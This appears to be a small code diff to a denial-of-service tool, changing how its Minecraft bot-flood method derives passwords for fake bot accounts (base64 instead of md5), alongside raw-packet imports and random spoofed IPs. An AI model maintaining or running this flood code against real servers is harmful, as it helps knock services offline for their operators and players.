@@ -35,7 +35,7 @@ from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
-from hashlib import md5
+from base64 import b64encode
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -547,7 +547,7 @@ class Layer4(Thread):
                                                         ProxyTools.Random.rand_ipv4(),
                                                         uuid4()))
             username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
-            password = md5(username.encode()).hexdigest()[:8].title()
+            password = b64encode(username.encode()).decode()[:8].title()
             Tools.send(s, Minecraft.login(self.protocolid, username))
             
             sleep(1.5)
